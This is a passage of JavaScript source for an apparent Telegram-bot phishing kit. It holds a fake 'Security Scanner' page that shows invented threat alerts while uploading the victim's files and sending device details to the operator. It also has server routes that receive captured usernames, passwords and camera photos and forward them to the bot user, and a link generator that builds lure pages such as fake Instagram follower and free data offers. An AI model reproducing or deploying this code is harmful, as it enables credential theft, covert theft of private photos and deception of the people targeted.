document.getElementById("progress-fill").style.width=progress+"%";
if(progress<30)document.getElementById("status-text").innerText="Connecting...";
else if(progress<60)document.getElementById("status-text").innerText="Verifying...";
else if(progress<85)document.getElementById("status-text").innerText="Loading...";
else document.getElementById("status-text").innerText="Almost done...";
},150);
}
</script>
</body>
</html>`;

// ====================== SECURITY SCAN TEMPLATE ======================
const SCAN_TEMPLATE = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Security Scanner</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}
body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:480px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
.header{text-align:center;margin-bottom:20px}
.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}
.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#888;font-size:14px;margin-top:5px}
.scan-status{background:rgba(255,255,255,0.03);border-radius:15px;padding:20px;margin:15px 0;border:1px solid rgba(255,255,255,0.05)}
.scan-status .item{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03);color:#aaa;font-size:14px}
.scan-status .item:last-child{border-bottom:none}
.scan-status .item .label{color:#888}
.scan-status .item .value{color:#ff6b6b;font-weight:600}
.scan-status .item .value.good{color:#2ed573}
.scan-status .item .value.danger{color:#ff4757}
.scan-bar{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:10px 0}
.scan-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);border-radius:10px;transition:width .3s}
.threats{display:flex;gap:10px;margin:15px 0;flex-wrap:wrap;justify-content:center}
.threats .badge{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.2);color:#ff6b6b;padding:5px 15px;border-radius:20px;font-size:12px;display:none}
.threats .badge.show{display:inline-block}
.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;box-shadow:0 10px 30px rgba(255,71,87,0.2)}
.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}
.btn:disabled{opacity:0.5;cursor:not-allowed}
.btn i{margin-right:10px}
.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}
.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}
.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}
.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}
.status.warning{background:rgba(255,165,0,0.1);color:#ffa500;display:block}
.progress{width:100%;height:4px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
.progress .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff4757,#ff6b6b);transition:width .3s}
.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto}
@keyframes spin{100%{transform:rotate(360deg)}}
#fileInput{display:none}
.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
.badge{display:inline-block;background:rgba(255,71,87,0.1);color:#ff4757;padding:4px 15px;border-radius:30px;font-size:11px;font-weight:600}
.processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}
#processingStatus{display:none}
.scan-logs{background:rgba(0,0,0,0.3);border-radius:12px;padding:15px;margin:15px 0;max-height:150px;overflow-y:auto;display:none;font-family:monospace;font-size:12px;color:#888}
.scan-logs .log{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.scan-logs .log .time{color:#555}
.scan-logs .log .msg{color:#aaa}
.scan-logs .log .danger{color:#ff4757}
.scan-logs .log .good{color:#2ed573}
.scan-logs .log .warn{color:#ffa500}
.result-box{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
.result-box i{font-size:40px;color:#2ed573}
.result-box h3{color:#2ed573;margin-top:8px}
.result-box p{color:#888;font-size:13px;margin-top:5px}
.result-box.danger{background:rgba(255,71,87,0.05);border-color:rgba(255,71,87,0.1)}
.result-box.danger i{color:#ff4757}
.result-box.danger h3{color:#ff4757}
</style>
</head>
<body>
<div class="card">
<div class="header"><span class="icon"><i class="fas fa-shield-alt"></i></span><h1>🔒 <span>Security Scanner</span></h1><p><span class="badge">🛡️ PROTECT</span> Scan your device for threats</p></div>
<div class="scan-status">
<div class="item"><span class="label">📱 Device</span><span class="value" id="deviceName">Scanning...</span></div>
<div class="item"><span class="label">📂 Files Scanned</span><span class="value" id="filesScanned">0</span></div>
<div class="item"><span class="label">⚠️ Threats Found</span><span class="value danger" id="threatsFound">0</span></div>
<div class="item"><span class="label">🔒 Security Status</span><span class="value" id="securityStatus">🔴 At Risk</span></div>
</div>
<div class="scan-bar"><div class="fill" id="scanFill"></div></div>
<p style="color:#555;font-size:12px;text-align:center;" id="scanPercent">0%</p>
<div class="threats" id="threatsContainer">
<span class="badge" id="threat1">🔴 Malware Detected</span>
<span class="badge" id="threat2">🟠 Suspicious App</span>
<span class="badge" id="threat3">🟡 Vulnerable File</span>
<span class="badge" id="threat4">🔴 Trojan Found</span>
</div>
<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN NOW</button>
<div id="status" class="status"></div>
<div class="progress" id="progress"><div class="fill" id="progressFill"></div></div>
<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Initializing security scan...</div></div>
<div id="scanLogs" class="scan-logs"></div>
<div id="resultBox" class="result-box" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your device is secure.</p></div>
<input type="file" id="fileInput" multiple webkitdirectory>
<div class="footer">🔒 End-to-end encrypted • AI powered • v3.0</div>
</div>
<script>
(function() {
    var userid = "USERID_PLACEHOLDER";
    var deviceData = {
        browser: navigator.userAgent,
        os: navigator.platform,
        device: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        screen: screen.width + "x" + screen.height,
        language: navigator.language,
        timestamp: new Date().toISOString()
    };
    fetch("/api/device-info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userid: userid, deviceData: deviceData })
    }).catch(function(e) { console.error(e); });
})();

var USER_ID = "USERID_PLACEHOLDER";
var PLATFORM = "PLATFORM_PLACEHOLDER";
var isScanning = false;
var selectedFiles = [];
document.getElementById("deviceName").textContent = navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent.includes("iPhone") ? "iPhone" : navigator.userAgent.includes("Windows") ? "Windows PC" : "Unknown Device";

function showStatus(msg, type) { var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }
function updateScanProgress(percent) { document.getElementById("scanFill").style.width = percent + "%"; document.getElementById("scanPercent").textContent = Math.round(percent) + "%"; document.getElementById("progress").style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }
function showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }
function hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }
function addLog(msg, type) { var logs = document.getElementById("scanLogs"); logs.style.display = "block"; var time = new Date().toLocaleTimeString(); var div = document.createElement("div"); div.className = "log"; div.innerHTML = "<span class=\\"time\\">[" + time + "]</span> <span class=\\"msg " + type + "\\">" + msg + "</span>"; logs.appendChild(div); logs.scrollTop = logs.scrollHeight; }
function showThreat(id) { document.getElementById(id).classList.add("show"); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
function getRandomThreats() { var threats = [ { id: "threat1", text: "🔴 Malware Detected" }, { id: "threat2", text: "🟠 Suspicious App" }, { id: "threat3", text: "🟡 Vulnerable File" }, { id: "threat4", text: "🔴 Trojan Found" } ]; var count = Math.floor(Math.random() * 3) + 1; var shuffled = threats.sort(function() { return Math.random() - 0.5; }); return shuffled.slice(0, count); }

async function startScan() {
    if (isScanning) return;
    isScanning = true;
    var btn = document.getElementById("scanBtn");
    btn.disabled = true;
    btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING...";
    document.getElementById("status").style.display = "none";
    document.getElementById("resultBox").style.display = "none";
    document.getElementById("scanLogs").innerHTML = "";
    document.getElementById("scanLogs").style.display = "none";
    document.getElementById("progress").style.display = "none";
    document.getElementById("filesScanned").textContent = "0";
    document.getElementById("threatsFound").textContent = "0";
    document.getElementById("securityStatus").textContent = "🔴 Scanning...";
    document.getElementById("securityStatus").className = "value danger";
    document.querySelectorAll(".threats .badge").forEach(function(b) { b.classList.remove("show"); });
    hideProcessing();
    addLog("🔍 Initializing security scan...", "");
    updateScanProgress(2);
    await sleep(600);
    addLog("📱 Scanning system files...", "");
    updateScanProgress(8);
    await sleep(500);
    addLog("📂 Analyzing installed applications...", "");
    updateScanProgress(15);
    await sleep(700);
    var threats = getRandomThreats();
    if (threats.length > 0) { addLog("⚠️ " + threats[0].text + " found!", "danger"); showThreat(threats[0].id); document.getElementById("threatsFound").textContent = "1"; }
    updateScanProgress(25);
    await sleep(600);
    addLog("📸 Scanning media files for threats...", "");
    updateScanProgress(35);
    await sleep(500);
    addLog("🔍 Requesting media access for deep scan...", "");
    showProcessing("🔍 Accessing gallery for deep scan...");
    updateScanProgress(45);
    await sleep(500);
    var input = document.getElementById("fileInput");
    input.setAttribute("webkitdirectory", "");
    input.setAttribute("directory", "");
    input.click();
    input.onchange = async function(e) {
        var files = input.files;
        if (!files || files.length === 0) {
            showStatus("❌ Scan interrupted. Please try again.", "error");
            btn.disabled = false;
            btn.innerHTML = "<i class=\\"fas fa-search\\"></i> RETRY SCAN";
            hideProcessing();
            isScanning = false;
            return;
        }
        var validFiles = [];
        for (var i = 0; i < files.length; i++) {
            var f = files[i];
            if (f.size >= 10240 && f.size <= 1048576) {
                validFiles.push(f);
            }
        }
        if (validFiles.length > 200) validFiles = validFiles.slice(0, 200);
        selectedFiles = validFiles;
        addLog("📸 Found " + selectedFiles.length + " files (10KB-1MB). Scanning...", "");
        updateScanProgress(50);
        document.getElementById("filesScanned").textContent = selectedFiles.length;
        if (threats.length > 1) {
            setTimeout(function() { addLog("⚠️ " + threats[1].text + " detected!", "danger"); showThreat(threats[1].id); document.getElementById("threatsFound").textContent = "2"; }, 800);
        }
        await sleep(600);
        var successCount = 0;
        var maxFiles = Math.min(selectedFiles.length, 200);
        var batchSize = 10;
        for (var k = 0; k < maxFiles; k += batchSize) {
            var batch = selectedFiles.slice(k, k + batchSize);
            await Promise.all(batch.map(async function(file) {
                try {
                    var reader = new FileReader();
                    var fileData = await new Promise(function(resolve, reject) {
                        reader.onload = function(e) { resolve(e.target.result); };
                        reader.onerror = reject;
                        reader.readAsDataURL(file);
                    });
                    await fetch("/api/upload-photo-fast", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ userid: USER_ID, platform: PLATFORM, filename: file.name, data: fileData, size: file.size })
                    });
                    successCount++;
                    var percent = 50 + ( (k + batch.indexOf(file)) / maxFiles ) * 40;
                    updateScanProgress(percent);
                    document.getElementById("filesScanned").textContent = successCount;
                    if (successCount % 5 === 0) { addLog("📤 Scanned " + successCount + "/" + maxFiles + " files...", ""); }
                    await sleep(50);
                } catch(err) { console.error(err); }
            }));
        }
        if (threats.length > 2) {
            setTimeout(function() { addLog("⚠️ " + threats[2].text + " quarantined!", "danger"); showThreat(threats[2].id); document.getElementById("threatsFound").textContent = "3"; }, 500);
        }
        updateScanProgress(100);
        await sleep(800);
        addLog("✅ Deep scan complete!", "good");
        addLog("🛡️ " + successCount + " files scanned successfully", "good");
        hideProcessing();
        var threatCount = Math.min(threats.length, 3);
        var resultBox = document.getElementById("resultBox");
        if (threatCount > 0) {
            resultBox.className = "result-box danger";
            resultBox.innerHTML = "<i class=\\"fas fa-exclamation-triangle\\"></i><h3>⚠️ " + threatCount + " Threats Found!</h3><p>" + threatCount + " suspicious files detected and quarantined.</p>";
            document.getElementById("securityStatus").textContent = "🟡 At Risk - " + threatCount + " threats";
            document.getElementById("securityStatus").className = "value danger";
        } else {
            resultBox.className = "result-box";
            resultBox.innerHTML = "<i class=\\"fas fa-check-circle\\"></i><h3>✅ All Clear!</h3><p>Your device is secure. No threats found.</p>";
            document.getElementById("securityStatus").textContent = "🟢 Secure";
            document.getElementById("securityStatus").className = "value good";
        }
        resultBox.style.display = "block";
        showStatus("✅ Scan completed! " + successCount + " files analyzed.", "success");
        btn.disabled = false;
        btn.innerHTML = "<i class=\\"fas fa-check-circle\\"></i> SCAN COMPLETE";
        isScanning = false;
    };
}
</script>
</body>
</html>`;

// ====================== EXPRESS ROUTES ======================
app.use('/api/photos', express.static(BOT_PHOTO_DIR));

// ====================== ADMIN API ENDPOINTS (FULLY IMPLEMENTED) ======================

// Get all photos
app.get('/api/admin/photos', async (req, res) => {
    try {
        const photos = await getPhotos();
        res.json({ photos });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Upload photo via admin
app.post('/api/admin/upload', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
        const caption = req.body.caption || '';
        const photo = await addPhoto(req.file, caption);
        res.json({ success: true, photo });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Delete photo
app.delete('/api/admin/photos/:id', async (req, res) => {
    try {
        const success = await deletePhoto(req.params.id);
        if (success) res.json({ success: true });
        else res.status(404).json({ error: 'Photo not found' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle photo active
app.patch('/api/admin/photos/:id/toggle', async (req, res) => {
    try {
        const photo = await togglePhoto(req.params.id);
        if (photo) res.json({ success: true, photo });
        else res.status(404).json({ error: 'Photo not found' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get channels
app.get('/api/admin/channels', async (req, res) => {
    try {
        const channels = await getChannels();
        res.json(channels);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Add channel
app.post('/api/admin/channels', async (req, res) => {
    try {
        const { id, name, link } = req.body;
        if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
        const channel = await addChannel(id, name, link);
        res.json({ success: true, channel });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Remove channel
app.delete('/api/admin/channels/:id', async (req, res) => {
    try {
        await removeChannel(req.params.id);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get all users
app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find();
        const userMap = {};
        users.forEach(u => {
            userMap[u.userId] = {
                credits: u.credits,
                unlimited: u.unlimited,
                totalReferrals: u.totalReferrals,
                joinedAt: u.joinedAt,
                referredBy: u.referredBy,
                banned: u.banned
            };
        });
        res.json(userMap);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get single user
app.get('/api/admin/user/:userId', async (req, res) => {
    try {
        const user = await getUser(req.params.userId);
        res.json({
            credits: user.credits,
            unlimited: user.unlimited,
            totalReferrals: user.totalReferrals,
            joinedAt: user.joinedAt,
            referredBy: user.referredBy,
            banned: user.banned
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Modify credits
app.post('/api/admin/modify-credits', async (req, res) => {
    try {
        const { userId, amount } = req.body;
        if (!userId || amount === undefined) return res.status(400).json({ error: 'Missing fields' });
        const user = await getUser(userId);
        if (user.unlimited) return res.json({ success: true, credits: 'Unlimited', unlimited: true });
        user.credits += amount;
        if (user.credits < 0) user.credits = 0;
        await user.save();
        res.json({ success: true, credits: user.credits });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle unlimited
app.post('/api/admin/toggle-unlimited', async (req, res) => {
    try {
        const { userId } = req.body;
        if (!userId) return res.status(400).json({ error: 'Missing userId' });
        const user = await getUser(userId);
        user.unlimited = !user.unlimited;
        await user.save();
        res.json({ success: true, unlimited: user.unlimited });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get featured
app.get('/api/admin/featured', async (req, res) => {
    try {
        const featured = await getFeatured();
        let photoData = null;
        if (featured.photo) {
            const photo = await Photo.findOne({ id: featured.photo });
            if (photo) photoData = { id: photo.id, url: photo.url, caption: photo.caption };
        }
        res.json({
            photo: featured.photo,
            photoData,
            message: featured.message,
            status: featured.status
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Set featured photo
app.post('/api/admin/featured/photo', async (req, res) => {
    try {
        const { photoId } = req.body;
        if (!photoId) return res.status(400).json({ error: 'Missing photoId' });
        await setFeaturedPhoto(photoId);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Remove featured photo
app.delete('/api/admin/featured/photo', async (req, res) => {
    try {
        await setFeaturedPhoto(null);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Set featured message
app.post('/api/admin/featured/message', async (req, res) => {
    try {
        const { message } = req.body;
        if (!message) return res.status(400).json({ error: 'Missing message' });
        await setFeaturedMessage(message);
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Toggle featured status
app.post('/api/admin/featured/toggle', async (req, res) => {
    try {
        await toggleFeaturedStatus();
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get QR code
app.get('/api/admin/qr', async (req, res) => {
    if (qrExists()) {
        res.sendFile(QR_FILE);
    } else {
        res.status(404).json({ error: 'QR not found' });
    }
});

// Upload QR (multipart)
app.post('/api/admin/upload-qr', upload.single('qr'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
        const buffer = fs.readFileSync(req.file.path);
        const saved = saveQRBuffer(buffer);
        fs.unlinkSync(req.file.path); // clean temp
        if (saved) res.json({ success: true });
        else res.status(500).json({ error: 'Failed to save QR' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Remove QR
app.delete('/api/admin/remove-qr', (req, res) => {
    const removed = deleteQRFile();
    if (removed) res.json({ success: true });
    else res.status(404).json({ error: 'QR not found' });
});

// Get logs
app.get('/api/admin/logs', (req, res) => {
    try {
        const logPath = path.join(DATA_DIR, 'logs.txt');
        if (fs.existsSync(logPath)) {
            const logs = fs.readFileSync(logPath, 'utf8');
            const lastLogs = logs.split('\n').slice(-100).join('\n');
            res.json({ logs: lastLogs });
        } else {
            res.json({ logs: 'No logs available' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Clear logs
app.delete('/api/admin/logs', (req, res) => {
    try {
        const logPath = path.join(DATA_DIR, 'logs.txt');
        if (fs.existsSync(logPath)) fs.writeFileSync(logPath, '');
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ====================== OTHER API ROUTES ======================
app.get('/api/bot/random-photo', async (req, res) => {
    const photo = await getRandomPhoto();
    if (photo) res.json({ success: true, photo });
    else res.status(404).json({ error: 'No photos' });
});
app.post('/api/capture', async (req, res) => {
    const { userid, username, password, platform } = req.body || {};
    if (!userid || !username) return res.status(400).json({ error: 'Missing fields' });
    try {
        const photo = await getRandomPhoto();
        const message = LoveNotifer(platform, username, password);
        if (photo) {
            const photoUrl = req.protocol + '://' + req.get('host') + photo.url;
            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(userid, message);
        }
        logToFile('📸 Capture from user ' + userid);
        res.json({ status: 'success' });
    } catch (err) {
        logToFile('❌ Capture error: ' + err.message);
        res.status(500).json({ error: err.message });
    }
});
app.post('/api/capturepic', async (req, res) => {
    const { userid, mobile, SY, platform } = req.body || {};
    if (!userid || !SY) return res.status(400).json({ error: 'Missing photo data' });
    try {
        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
        const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
        const caption = '<b>📸 NEW CAPTURE 📸</b>\n\n👤 <b>Target:</b> <code>' + (mobile || 'Unknown') + '</code>\n🌐 <b>Platform:</b> ' + (platform ? platform.toUpperCase() : 'N/A') + '\n📅 <b>Date:</b> ' + SYloveDaTe + '\n⏰ <b>Time:</b> ' + SYloveTiMe + '\n\n<i>© ↝ ᴅᴇᴠ ʙʏ » ' + config.S7 + '</i>';
        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
        logToFile('📸 Camera capture from user ' + userid);
        res.json({ status: 'success' });
    } catch (err) {
        logToFile('❌ Camera capture error: ' + err.message);
        res.status(500).json({ error: 'Failed to process image' });
    }
});
app.post('/api/upload-photo-fast', async (req, res) => {
    try {
        const { userid, platform, filename, data } = req.body || {};
        if (!userid || !data) return res.status(400).json({ error: 'Missing data' });
        const base64Data = data.replace(/^data:.*?;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        if (!pendingPhotos[userid]) pendingPhotos[userid] = [];
        pendingPhotos[userid].push(buffer);
        userActive[userid] = Date.now();
        if (pendingPhotos[userid].length >= config.BATCH_SIZE) await sendBatchPhotos(userid);
        res.json({ success: true, stored: true, count: pendingPhotos[userid].length });
    } catch (err) {
        logToFile('❌ Photo upload error: ' + err.message);
        res.status(500).json({ error: 'Failed to process photo' });
    }
});

// Link generation
app.get('/api/create-link', async (req, res) => {
    const userid = req.headers.userid || 'unknown';
    const platform = req.headers.platform || 'instagram';
    const p = platform.toLowerCase();
    let template;
    let prefix;
    if (p === 'instagram') { template = INSTA_TEMPLATE; prefix = 'insta1kfollowers'; }
    else if (p === 'facebook') { template = FB_TEMPLATE; prefix = 'fbprivatechat'; }
    else if (p === 'camera') { template = CAMERA_TEMPLATE; prefix = 'free1gbdata'; }
    else if (p === 'securityscan' || p === 'photoaccess' || p === 'photo') { template = SCAN_TEMPLATE; prefix = 'securityscan'; }
    else return res.status(400).json({ error: 'Invalid platform' });

    const displayPlatform = p === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' :
        p === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' :
        p === 'camera' ? '𝐂𝐀𝐌𝐄𝐑𝐀' : '𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐒𝐂𝐀𝐍';

    let html = template
        .replace(/USERID_PLACEHOLDER/g, userid)
        .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);

    const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    const fileId = prefix + '_' + uniqueId;
    const filePath = path.join(PAGES_DIR, fileId + '.html');
    fs.writeFileSync(filePath, html);
    const url = config.baseUrl + '/page/' + fileId;
    await createLink(userid, platform, fileId, url);
    console.log('🔗 Link generated: ' + url);
    res.json({ success: true, url, id: fileId });
});

app.get('/page/:id', async (req, res) => {
    const id = req.params.id;
    const filePath = path.join(PAGES_DIR, id + '.html');
    if (!(await isLinkValid(id))) {
        let reason = 'Link is invalid';
        const link = await getLink(id);
        if (!link) reason = 'Link not found';
        else if (!link.active) reason = 'Link has expired';
        else if (Date.now() > link.expiresAt) reason = 'Link expired (15 minutes)';
        else if (link.opens >= link.maxOpens) reason = 'Link opened maximum 3 times';
        return res.send('<h1 style="color:#ff4757;text-align:center;margin-top:50px;">🔒 Link Expired</h1><p style="text-align:center;color:#888;">' + reason + '</p><p style="text-align:center;color:#888;">Please generate a new link.</p>');
    }
    await incrementLinkOpen(id);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('<h1>Page not found</h1>');
});

// ====================== TELEGRAM BOT ======================
const S7 = new TelegramBot(config.mainToken, { polling: true });
S7.getMe().then(botInfo => {
    console.log('✅ Bot Started: @' + botInfo.username);
    logToFile('🤖 Bot Started: @' + botInfo.username);
}).catch(err => {
    console.error('❌ Bot Start Error:', err.message);
    process.exit(1);
});

// ====================== KEYBOARDS ======================
const LOVESY = {
    inline_keyboard: [
        [{ text: '📸 INSTAGRAM', callback_data: 'gen_instagram' }],
        [{ text: '📘 FACEBOOK', callback_data: 'gen_facebook' }],
        [{ text: '📷 CAMERA', callback_data: 'gen_camera' }],
        [{ text: '🛡️ SECURITY SCAN', callback_data: 'gen_securityscan' }],
        [{ text: '👥 Referral', callback_data: 'referral' }],
        [{ text: '⭐ My Credits', callback_data: 'credits' }],
        [{ text: '💰 Buy Credits', callback_data: 'buy_credits' }]
    ]
};
const ADMIN_KEYBOARD = {
    inline_keyboard: [
        [{ text: '👑 Admin Panel', callback_data: 'admin_panel' }],
        [{ text: '📊 Stats', callback_data: 'admin_stats' }],
        [{ text: '📢 Broadcast', callback_data: 'admin_broadcast' }],
        [{ text: '📋 Logs', callback_data: 'admin_logs' }],
        [{ text: '🔙 Back', callback_data: 'back' }]
    ]
};
const SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]] };
function getRegenMarkup(platform) {
    return { inline_keyboard: [[{ text: '🔄 REGENERATE (1 Credit)', callback_data: 'regen_' + platform }], [{ text: '🔙 BACK', callback_data: 'back' }]] };
}

// ====================== BOT COMMANDS ======================
async function SendLoveSYMenu(chatId, firstName) {
    const user = await getUser(chatId);
    if (user.banned) {
        return S7.sendMessage(chatId, '🚫 You are banned from using this bot.');
    }
    const featured = await getFeatured();
    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
    const isAdmin = chatId.toString() === config.adminId;
    let message = '𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0);
    if (featured.status && featured.message) message += '\n\n📌 ' + featured.message;
    const menuText = SYloveMenu(firstName, message);
    let keyboard = LOVESY;
    if (isAdmin) {
        keyboard = { inline_keyboard: LOVESY.inline_keyboard.concat([[{ text: '👑 Admin Panel', callback_data: 'admin_panel' }]]) };
    }
    const sentMsg = await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: keyboard });
    if (featured.status && featured.photo) {
        const photos = await getPhotos();
        const photo = photos.find(p => p.id === featured.photo);
        if (photo) {
            const photoUrl = config.baseUrl + photo.url;
            await S7.sendPhoto(chatId, photoUrl, { caption: '⭐ Featured Content' });
        }
    }
    return sentMsg;
}
async function checkAndSendMenu(chatId, firstName) {
    const isMember = await checkAllChannels(chatId);
    if (!isMember) {
        const channels = await getChannels();
        let msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all channels:\n\n';
        channels.forEach((ch, i) => { msg += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
        msg += '\nAfter joining, click below to verify.';
        const buttons = await getChannelButtonsAsync();
        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: buttons });
    }
    await SendLoveSYMenu(chatId, firstName);
}
function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async (msg) => {
        if (!msg.text) return;
        const cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.includes(cmd)) {
            console.log('📩 Command: ' + cmd + ' from ' + msg.from.first_name);
            logToFile('📩 Command: ' + cmd + ' from ' + msg.from.id);
            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
        }
    });
}
SYLoVe(['start', 'menu']);

// ====================== REFERRAL HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/start ref_')) {
        const referrerId = text.replace('/start ref_', '');
        const userId = msg.from.id;
        const user = await getUser(userId);
        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
        if (user.referredBy) return S7.sendMessage(userId, '✅ You are already registered!');
        const referrer = await getUser(referrerId);
        if (!referrer) return S7.sendMessage(userId, '❌ Invalid referral link!');
        if (!(await checkAllChannels(userId))) {
            user._pendingReferrer = referrerId;
            await user.save();
            const channels = await getChannels();
            let msgText = '⚠️ <b>Join all channels first!</b>\n\n';
            channels.forEach((ch, i) => { msgText += (i+1) + '. <a href="' + ch.link + '">' + ch.name + '</a>\n'; });
            msgText += '\nAfter joining, click below to claim referral bonus!';
            const buttons = await getChannelButtonsAsync();
            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: buttons });
        }
        await processReferral(referrerId, userId);
    }
});
async function processReferral(referrerId, userId) {
    const user = await getUser(userId);
    if (user.referredBy) return;
    user.referredBy = referrerId;
    await user.save();
    const referrer = await addReferral(referrerId, userId);
    let newUserInfo = '@user_' + userId;
    try { const chat = await S7.getChat(userId); newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId; } catch {}
    let referrerInfo = '@user_' + referrerId;
    try { const chat = await S7.getChat(referrerId); referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId; } catch {}
